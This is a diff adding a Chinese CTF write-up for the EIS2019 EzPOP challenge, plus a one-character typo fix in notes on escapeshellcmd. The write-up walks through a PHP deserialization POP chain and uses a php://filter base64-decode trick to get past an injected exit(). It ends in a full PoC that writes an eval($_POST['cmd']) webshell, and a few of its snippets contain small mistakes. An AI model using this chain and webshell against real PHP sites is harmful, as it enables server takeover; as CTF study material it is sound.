@@ -1472,6 +1472,179 @@ so:
 
     *注意先上传图片马，然后修改cookie，重新访问一下，使用蚁剑连接filename指示的路径*
 
+#### EIS2019 EzPOP
+
+##### 源码
+
+    [index.php](./code/EIS2019EzPOP/)
+
+##### 解题
+
+- 代码末尾看到一个`unserialize`,结合题目，考点大概是pop链反序列化
+- 首先要找到利用点，在 B 类的`set`函数中有`file_put_contents()`,而写入的内容是`$data`,所以可以让`$data`中的内容为webshell。
+- 但是往上看发现`$data`中有`exit`,这就会导致我们写入的webshell无法执行,这里可以用php伪协议绕过,具体参考[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+- 往上，虽然有个数据压缩的代码，但是只需要`options['data_compress']`为假就不进入`if`,就不会执行，经过了`serialize`函数，但这个函数并非是序列化函数，而是在`class B`中自定义的`serialize`函数。这个函数我们可以控制。
+
+    ```php
+    $serialize = $this->options['serialize'];
+    return $serialize($data);
+    ```
+
+- 上面还对`$filename`这个参数进行了处理，具体就是字符串拼接,如果我们不赋值就不会拼接。
+
+    ```php
+    $filename = $this->getCacheKey($name);
+    ...
+    public function getCacheKey(string $name): string {
+        return $this->options['prefix'] . $name;
+    }
+    ```
+
+- 接下来就是调用`class B`中的`set`函数。`class B`中的函数没办法调用`set`,但是`class A`中`save`函数中有这么一句代码。
+
+    ```php
+    $this->store->set($this->key, $contents, $this->expire);
+    ```
+
+    所以这里只需要令`$this->store=new B()`就可以调用`class B`的`set`函数了
+
+    下一步就是调用`save`函数了，而`class A`中下一个魔术函数`__destruct`就提供了调用`save`函数的方法，只需要令`$this->autosave=false`
+
+    完整的pop链就出来了。
+
+- pop链有了，下一步就是构造webshell了，因为原始代码会在文件中写入exit导致我们直接写入webshell的话是无法执行的。上面提到了可以用php伪协议绕过。
+
+    ```php
+    $filename = 'php://filter/write=convert.base64-decode/resource=xxx.php';
+    $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . "aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4="
+    file_put_contents($filename, $data);
+    // 这样可以直接将base64解码后的内容写入xxx.php
+    ```
+
+    `PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=` 是 `<?php eval($_POST['cmd']); ?>`的base64编码
+
+    base64 解码时以4个字符为一组。
+
+    base64编码中只包含64个可打印字符，base64解码时遇到不在不在这64个字符中的字符会自动忽略，仅将合法字符组合进行解码
+    
+    所以`$data`前半部分字符中`<、?、()、;、>、\n`都不在这64个字符范围内，在解码时会自动将其忽略从而剩下`phpexit//`这9个字符以及`sprintf('%012d', $expire)`格式化打印的12个字符，因此为了防止在解码时破坏构造的webshell，所以需要在webshell的base64编码前加上三个字符组合成4的倍数。
+
+
+- `$filename`来自`class A`的`key`,传参过程中没有经过什么变换，在`class A`中可以直接令`$this->key='php://filter/write=convert.base64-decode/resource=xxx.php'`
+
+- `$data`来自`class A`的`$contents`，`$contents`变量来自函数`getForStorage()`的返回值，其中参数为数组`[$cleaned, $this->complete]`，两个选择，第一让`$cleaned`为shell内容，第二就是`$complete`
+
+    *注意：这里的webshell base64编码次数由`class B`中`$this->options['serialize']`的值决定。当`$this->options['serialize'] = 'base64_encode'`时，不管是用那个变量构造webshell，都要对webshell编码两次，而且第二次编码时要在开头增加三个字符；当`$this->options['serialize'] = 'trim'`时， 编码一次就行，编码完成后在开头增加三个字符*
+
+    ```php
+    public function save() {
+        $contents = $this->getForStorage();
+
+        $this->store->set($this->key, $contents, $this->expire);
+    }
+
+    public function getForStorage() {
+        $cleaned = $this->cleanContents($this->cache);
+
+        return json_encode([$cleaned, $this->complete]);
+    }
+    ```
+
+    1. 利用`$cleaned`构造webshell
+
+        `$cleaned`是`$this->cache`经过`cleanContents`函数处理的返回值
+
+        ```php
+        public function cleanContents(array $contents) {
+        $cachedProperties = array_flip([
+            'path', 'dirname', 'basename', 'extension', 'filename',
+            'size', 'mimetype', 'visibility', 'timestamp', 'type',
+        ]);
+
+        foreach ($contents as $path => $object) {
+            if (is_array($object)) {
+                $contents[$path] = array_intersect_key($object, $cachedProperties);
+            }
+        }
+
+        return $contents;
+        }
+        ```
+        这个函数首先会交换`$cachedProperties`数组中的键和值，即键值互换
+
+        然后对传入的数组参数进行处理，具体操作时如果数组中某一个值仍是数组则对这个数组和`$cachedProperties`数组求交集，如果数组中的值不是数组就不做处理。
+
+        这里我们就可以利用`$cache`对`$cleaned`进行赋值，在`class A`中令`$this->cache = array(1234=>'aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=')`
+    
+    2. 利用`$this->complete`构造webshell
+
+        `$cleaned`为一个空数组就行了。它调用了`cleanContents($this->cache)`;因为函数参数是数组类型，所以让`$this->cache=array()`;为一个空数组，防止调用报错。
+
+        所以在`class A`的初始化的时候令`$this->complete="111".base64_encode('<?php eval($_POST["cmd"]);?>')`
+
+- 但是在`set`函数中`$data`经过了`class B`自定义的`serialize`函数处理
+
+    ```php
+        protected function serialize($data): string {
+            if (is_numeric($data)) {
+                return (string) $data;
+            }
+
+            $serialize = $this->options['serialize'];
+
+            return $serialize($data);
+        }
+    ```
+    所以这个自定义函数我们可控，这里有两种方法
+
+    1. 两次base64编码，如
+
+        ```php
+        // class A
+        $this->complete = base64_encode("111".base64_encode('<?php eval($_POST["cmd"]); ?>'));
+        //class B
+        $this->options['serialize'=>'base_decode'];
+        ```
+
+    2. 利用php中的一些处理字符串的函数使`$data`经过这种函数处理后不会改变webshell的base64编码值,如`trim`函数，这个函数作用是移除字符串首尾空白字符
+
+        ```php
+        // class A
+        $this->complete = '"111".base64_encode('<?php eval($_POST["cmd"]); ?>')';
+        // class B
+        $this->options['serialize'=>'trim'];
+        ```
+
+- poc
+
+    ```php
+    <?php
+    error_reporting(0);
+    class A {
+        protected $store;
+        protected $key;
+        protected $expire;
+        public $complete;
+        public function __construct() {
+            $this->cache = array();
+    /*        $this->complete = base64_encode("111".base64_encode('<?php eval($_POST["cmd"]); ?>'));*/
+            $this->complete = "111".base64_encode('<?php eval($_POST["cmd"]); ?>');
+            $this->key = "php://filter/write=convert.base64-decode/resource=eval.php";
+            $this->store = new B();
+            $this->autosave = false;
+        }
+    }
+    class B {
+        public $options = array();
+        public function __construct(){
+            $this->options['serialize'] = 'trim';
+            $this->options['data_compress'] = false;
+        }
+    }
+    echo urlencode(serialize(new A()));
+```
+
+
 ### 类型四-phar反序列化
 
 1. phar反序列化
@@ -3386,7 +3559,7 @@ escapeshellcmd — shell 元字符转义
 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
 
 反斜线（\）会在以下字符之前插入：
-&#;`|?~<>^()[]{}$, \x0A 和 \xFF。 *’ 和 “ 仅在不配对儿的时候被转义。
+&#;`|?~<>^()[]{}$, \x0A 和 \xFF。 *’ 和 “ 仅在不配对的时候被转义。
 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
 ```
 
